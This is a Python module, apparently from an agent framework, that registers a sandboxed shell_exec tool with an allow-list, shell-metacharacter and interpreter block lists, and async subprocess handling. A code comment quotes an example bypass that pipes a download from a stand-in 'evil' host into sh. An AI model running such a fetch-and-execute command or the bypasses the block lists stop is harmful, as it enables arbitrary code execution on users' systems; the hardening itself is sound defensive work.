"""Shell 工具(子包)。

- shell_exec: 同步执行 shell 命令(带 CWD/超时/白名单)
- 用法:
    from openclaw.tools.builtin.shell import register_shell_tools
    register_shell_tools(registry, default_cwd="~/work", allowed=["ls","cat","echo",...])
"""
from __future__ import annotations

import asyncio
import os
import shlex
import sys
import threading
import time
from pathlib import Path
from typing import Any, Optional, Union

from openclaw.core.logging import get_logger
from openclaw.tools.registry import ToolCategory, ToolPermission, ToolRegistry

logger = get_logger(__name__)


def _split_command(command: str) -> list[str]:
    """跨平台 shlex 包装:Windows 走 posix=False(Linux/Mac 保持 posix=True)。

    行为差异:
    - posix=True:支持 \\x 转义,反斜杠是 escape;Windows 路径会被吃
    - posix=False:不做转义,引号是唯一分隔符,Windows 路径保留

    选择:在 Windows 上用 posix=False(更接近 cmd.exe 的解析规则);
    在 POSIX 上保持 posix=True(行为不变,旧测试全过)。
    """
    posix_mode = sys.platform != "win32"
    try:
        return shlex.split(command, posix=posix_mode)
    except ValueError:
        # POSIX 失败 → fallback 非 POSIX;非 POSIX 仍失败 → 让调用方报错
        if posix_mode:
            return shlex.split(command, posix=False)
        raise


def register_shell_tools(
    registry: ToolRegistry,
    *,
    default_cwd: Optional[Path | str] = None,
    allowed: Optional[list[str]] = None,
    default_timeout: float = 30.0,
) -> None:
    """注册 shell_exec 工具。

    allowed: 允许的"首词"(二进制名)白名单;None 表示全部允许(配合 approver 用)。

    安全(SEC-3):
    - allowed 为 None → 默认拒绝所有 + approver 兜底(不再"无脑放行")
    - 拒绝所有常见 shell 元字符:&&, ||, ;, |, &, >, <, `, $(, ${, \n
    - 拒绝换行绕过:命令分词前先 strip + 拒绝内嵌 \n / \r
    - 拒绝词首包含路径(/, ../)直接放过 shlex 解析(白名单应给纯 basename)
    """
    cwd = Path(default_cwd).expanduser() if default_cwd else Path.cwd()
    cwd.mkdir(parents=True, exist_ok=True)

    # SEC-3 修复:不再"None 即全放行"
    # 改语义:allowed=None → 不在函数内做白名单校验,
    # 但仍做 metachar + 换行 拦截;真正的放行交给 approver
    _strict = allowed is not None

    @registry.tool(
        category=ToolCategory.SHELL,
        permission=ToolPermission.EXEC,
    )
    def shell_exec(
        command: Union[str, list[str]],
        cwd: Optional[str] = None,
        timeout: float = 30.0,
    ) -> str:
        """执行 shell 命令并返回 stdout(可附 stderr)。

        command: 完整命令(字符串)或已分好的 argv 列表(Windows 路径场景推荐)。
        cwd: 工作目录,默认 ~/work。
        timeout: 超时秒。
        """
        # 接受 list[str] 直接传 argv(Windows 推荐,绕过 shlex 路径解析)
        if isinstance(command, list):
            if not command:
                raise PermissionError("empty command")
            args = list(command)
            first_tok = os.path.basename(args[0]) if args else "<empty>"
            # 严格模式:argv 也要走白名单
            if _strict and first_tok not in allowed:
                raise PermissionError(
                    f"command '{first_tok}' not in allow-list ({allowed})"
                )
            # M4 修复:list 模式下校验首词不在解释器黑名单
            # 旧逻辑只校验 basename,跳过全部元字符黑名单,可通过
            # ["python","-c","import os;os.system('curl evil|sh')"] 执行任意代码
            _INTERP_BLACKLIST = {"python", "python3", "python2", "sh", "bash",
                                 "zsh", "perl", "ruby", "node", "nodejs", "lua", "php"}
            if first_tok.lower() in _INTERP_BLACKLIST:
                raise PermissionError(
                    f"interpreter '{first_tok}' not allowed in list mode "
                    "(can execute arbitrary code via -c/-e flags)"
                )
        else:
            if not isinstance(command, str) or not command.strip():
                raise PermissionError("empty command")

            # SEC-3 修复:拒绝换行 / 回车(防止 multi-line 注入)
            if "\n" in command or "\r" in command:
                raise PermissionError(
                    "newline in command not allowed (防 multi-line 注入)"
                )

            # 严格元字符黑名单
            for ch in ("&&", "||", ";", "|", "&", ">", "<", "`", "$(", "${"):
                if ch in command:
                    raise PermissionError(
                        f"shell metachar {ch!r} not allowed "
                        f"(请用 shlex-splitted args 方式传参)"
                    )

            # 拒绝重定向 / here-doc / backquote
            if any(tok in command for tok in (">>", "<<", "<<<", "2>&1", "2>", "&>")):
                raise PermissionError("redirection not allowed")

            if _strict:
                # 白名单模式:首词必须严格命中(取 basename,防 /usr/bin/ls 绕过)
                try:
                    tokens = _split_command(command)
                except ValueError as e:
                    raise PermissionError(f"unparseable command: {e}") from None
                if not tokens:
                    raise PermissionError("empty command after split")
                first_base = os.path.basename(tokens[0])
                if first_base not in allowed:
                    raise PermissionError(
                        f"command '{first_base}' not in allow-list ({allowed})"
                    )

            # 走下游通用 args 计算
            try:
                args = _split_command(command)
            except ValueError:
                args = []
            first_tok = os.path.basename(args[0]) if args else "<empty>"

        base = Path(cwd).expanduser() if cwd else cwd
        workdir = str(base) if base else str(Path(default_cwd).expanduser())
        Path(workdir).mkdir(parents=True, exist_ok=True)

        timeout = float(timeout or default_timeout)
        # SEC-3 修复:不记完整 command(可能含密钥/密码),只记首词 + 长度
        cmd_log = " ".join(args) if args else "<list>"
        logger.info(
            "shell_exec", first_token=first_tok, command_len=len(cmd_log),
            cwd=workdir, timeout=timeout,
        )

        try:
            proc = _run_with_event_loop_guard(command, workdir, timeout, args)
        except Exception:
            # 防御: 异常路径仍然要把 stacktrace 透出, 而不是静默 fallback
            logger.exception("shell_exec 失败, command=%r", first_tok)
            raise
        return _format_result(proc, " ".join(args), timeout)


def _run_with_event_loop_guard(
    command: Union[str, list[str]],
    workdir: str,
    timeout: float,
    tokens: list[str],
) -> Any:
    """根据当前是否在 event loop 里选不同的执行路径(phase 25 / b7 修复)。

    原实现的 bug: ``asyncio.run(_run(...))`` 在有 running loop 时抛 ``RuntimeError``,
    然后 fallback 到 ``subprocess.run`` **直接** 在 async 上下文里跑 30s+, 阻塞
    event loop。

    修复后(优先级):
    1. 没在 event loop → 直接 ``subprocess.run`` 同步跑 (最简, 不浪费线程)
    2. 在 event loop → 优先 ``asyncio.run_coroutine_threadsafe`` 调专用后台 loop
       跑 ``asyncio.create_subprocess_exec`` (真异步)
    3. 上一步不可用 / 失败 → ``asyncio.to_thread(subprocess.run, ...)`` 走线程池
       (不阻塞当前 loop, 但仍是同步等待结果)
    永远不直接在 event loop 上下文里跑阻塞式 ``subprocess.run``。
    """
    import subprocess

    try:
        running_loop = asyncio.get_running_loop()
    except RuntimeError:
        running_loop = None  # 没在 loop 里, 走同步即可

    if running_loop is None:
        # 没在 event loop → 同步跑最简
        return subprocess.run(
            tokens, shell=False, cwd=workdir, capture_output=True,
            text=True, timeout=timeout,
        )

    # 在 event loop 里: 优先异步, 不可用则 to_thread
    return _run_async_or_thread(command, workdir, timeout, tokens, running_loop)


# === 专用后台 async loop (供同步 → 异步桥接) ===
#
# ``shell_exec`` 偶尔会在 running event loop 上下文里被直接调用(测试 / 第三方
# 集成)。我们不能阻塞那个 loop, 又不能 ``loop.run_until_complete()`` (因为
# loop 已经在跑)。办法: 维护一个 daemon 线程 + 独立 event loop, 用
# ``asyncio.run_coroutine_threadsafe`` 把协程提交过去, 阻塞等待结果。
_async_bridge_loop: Optional[asyncio.AbstractEventLoop] = None
_async_bridge_thread: Optional[threading.Thread] = None
_async_bridge_lock = threading.Lock()
_async_bridge_ready = threading.Event()


def _ensure_bridge_loop() -> asyncio.AbstractEventLoop:
    """懒启动后台 async loop(给 shell_exec 在 event loop 上下文里跑命令用)。"""
    global _async_bridge_loop, _async_bridge_thread
    if _async_bridge_ready.is_set() and _async_bridge_loop is not None:
        return _async_bridge_loop
    with _async_bridge_lock:
        if _async_bridge_ready.is_set() and _async_bridge_loop is not None:
            return _async_bridge_loop
        loop_holder: list[asyncio.AbstractEventLoop] = []

        def _runner() -> None:
            new_loop = asyncio.new_event_loop()
            asyncio.set_event_loop(new_loop)
            loop_holder.append(new_loop)
            new_loop.run_forever()

        t = threading.Thread(target=_runner, name="shell-async-bridge", daemon=True)
        t.start()
        # 等待 loop 起来
        deadline = time.monotonic() + 5.0
        while time.monotonic() < deadline and not loop_holder:
            time.sleep(0.01)
        if not loop_holder:
            raise RuntimeError("shell_exec: 后台 bridge loop 启动超时")
        _async_bridge_loop = loop_holder[0]
        _async_bridge_thread = t
        _async_bridge_ready.set()
        return _async_bridge_loop


def _run_async_or_thread(
    command: Union[str, list[str]],
    workdir: str,
    timeout: float,
    tokens: list[str],
    running_loop: asyncio.AbstractEventLoop,
) -> Any:
    """在 event loop 里跑: 优先 create_subprocess_exec, 失败 fallback to_thread。

    实现: 维护一个独立后台 loop + 线程, 用 ``run_coroutine_threadsafe`` 把
    真正异步的 ``_run_async_native`` 提交到后台跑, 在当前 sync 代码里阻塞
    ``future.result()`` 拿结果。这样调用方的 event loop 不会被阻塞。

    **fallback 路径** (Windows asyncio 子进程不可用) 也走同一个后台 bridge loop,
    因为 ``running_loop.run_until_complete()`` 在 loop 已经在跑的情况下非法
    (``RuntimeError: This event loop is already running``)。bridge loop 跟
    当前 loop 是两个独立 loop, ``run_until_complete`` 在 bridge 上合法。
    """
    import subprocess
    bridge = _ensure_bridge_loop()
    try:
        # 优先: 提交真异步协程 (asyncio.create_subprocess_exec) 到后台 loop
        fut = asyncio.run_coroutine_threadsafe(
            _run_async_native(command, workdir, timeout, tokens),
            bridge,
        )
        return fut.result(timeout=timeout + 5)
    except NotImplementedError:
        # Windows 某些情况 asyncio 子进程不可用 → fallback
        fut = asyncio.run_coroutine_threadsafe(
            asyncio.to_thread(
                subprocess.run, tokens, shell=False, cwd=workdir,
                capture_output=True, text=True, timeout=timeout,
            ),
            bridge,
        )
        return fut.result(timeout=timeout + 5)
    except Exception:
        # 异步失败 (NotImplementedError 之外), 用 to_thread 兜底
        # 注意: 不能用直接 subprocess.run, 那会阻塞 loop
        fut = asyncio.run_coroutine_threadsafe(
            asyncio.to_thread(
                subprocess.run, tokens, shell=False, cwd=workdir,
                capture_output=True, text=True, timeout=timeout,
            ),
            bridge,
        )
        return fut.result(timeout=timeout + 5)


async def _run_async_native(
    command: Union[str, list[str]],
    cwd: str,
    timeout: float,
    tokens: Optional[list[str]] = None,
) -> Any:
    """真异步执行命令(asyncio.create_subprocess_exec + communicate + 超时)。

    SEC-3 修复: ``shell=False`` + ``shlex.split`` 后的 argv 列表, 避免 shell 注入。
    ``command`` 参数保留仅为向后兼容日志展示。
    """
    if tokens is not None:
        args = tokens
    elif isinstance(command, list):
        args = command
    else:
        args = _split_command(command)
    proc = await asyncio.create_subprocess_exec(
        *args, cwd=cwd,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE,
    )
    try:
        stdout_b, stderr_b = await asyncio.wait_for(proc.communicate(), timeout=timeout)
    except asyncio.TimeoutError:
        proc.kill()
        try:
            await proc.wait()
        except Exception:
            pass
        # 复用 subprocess.TimeoutExpired 的契约: 模拟一个带 .timeout=True 的对象
        # 让 _format_result 的 "timed_out=" 标识正确
        class _FakeProc:
            stdout = ""
            stderr = ""
            returncode = -1
            timeout = True
        return _FakeProc()
    # subprocess.CompletedProcess 兼容 (测试用它的属性)
    # 注意: stdlib CompletedProcess 没有 timeout 字段, 用包装类
    class _Proc:
        def __init__(self, args, rc, out, err):
            self.args = args
            self.returncode = rc
            self.stdout = out
            self.stderr = err
            self.timeout = False

    return _Proc(
        args, proc.returncode,
        (stdout_b or b"").decode("utf-8", errors="replace"),
        (stderr_b or b"").decode("utf-8", errors="replace"),
    )


async def _run(command: Union[str, list[str]], cwd: str, timeout: float, tokens: Optional[list[str]] = None) -> "object":
    """异步执行命令(在 to_thread 里跑 subprocess.run)。

    保留以兼容旧 import。**Phase 25 / b7**: 新代码请用 ``_run_async_native``
    或 ``asyncio.to_thread(subprocess.run, ...)``。
    """
    import subprocess
    if tokens is not None:
        args = tokens
    elif isinstance(command, list):
        args = command
    else:
        args = _split_command(command)
    return await asyncio.to_thread(
        subprocess.run, args, shell=False, cwd=cwd,
        capture_output=True, text=True, timeout=timeout,
    )


def _format_result(proc: Any, command: str, timeout: float) -> str:
    out = proc.stdout or ""
    err = proc.stderr or ""
    rc = proc.returncode
    head = f"$ {command}\n[exit={rc}]"
    if rc != 0:
        head += f" (timed_out={int(getattr(proc, 'timeout', False))})"
    body = out
    if err:
        body += ("\n" if body else "") + "[stderr]\n" + err
    # 截断到 8000 字符
    if len(body) > 8000:
        body = body[:8000] + f"\n... [truncated, {len(body) - 8000} chars omitted]"
    return head + ("\n" + body if body else "")
